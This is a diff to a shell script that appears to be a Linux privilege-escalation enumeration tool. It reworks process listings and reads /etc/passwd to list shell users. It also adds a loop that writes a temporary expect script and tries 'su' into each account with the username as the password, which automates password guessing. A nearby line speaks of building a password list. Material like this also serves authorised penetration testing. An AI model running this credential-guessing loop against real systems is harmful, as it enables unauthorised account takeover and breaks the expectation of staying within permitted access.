@@ -93,7 +93,7 @@ echo "#####################################################"
 echo ""
 echo ""
 
-ps -aux  | grep -v "0:00" | awk '$4 > 0.0 {print $0}' | grep "root"
+ps -aux  | awk '$4 > 0.0 && $10 != "0:00"  && $10 != "0:00.00" {print $0}' | grep "root"
 
 echo ""
 echo ""
@@ -103,7 +103,7 @@ echo "#####################################################"
 echo ""
 echo ""
 
-ps -aux  | grep -v "0:00" | awk '$4 > 0.0 {print $0}' | grep -v "root"
+ps -aux  | awk '$4 > 0.0 && $10 != "0:00"  && $10 != "0:00.00" {print $0}'  | grep -v "root"
 
 echo ""
 echo ""
@@ -252,7 +252,7 @@ echo "#####################################################"
 echo ""
 echo ""
 
-grep -v '^[^:]*:[x]' /etc/passwd 2>/dev/null
+cat /etc/passwd | grep -v  ":\*:" | grep "sh$" 
 
 echo ""
 echo ""
@@ -597,12 +597,24 @@ echo "Don't forget to put them in password list"
 echo ""
 echo ""
 echo "#####################################################"
-echo "Try su with default pass"
+echo "User with password set as username"
 echo "#####################################################"
 echo ""
 echo ""
 
-#for i in $(grep -E "home" /etc/passwd | cut -d: -f1 ); do echo $i; su - $i -c id; done; 
+for i in $(cat /etc/passwd |grep "sh$" | cut -d: -f1 )
+do
+cat << EOFN > /tmp/expect.sh
+#!/usr/bin/expect -f
+set timeout 5
+spawn su - $i -c id
+expect "Password: " {send "$i\r"}
+expect eof
+EOFN
+chmod +x /tmp/expect.sh && /tmp/./expect.sh | grep -vi "password\|spawn\|Authentication"
+done
+
+rm /tmp/expect.sh
 
 echo ""
 echo ""
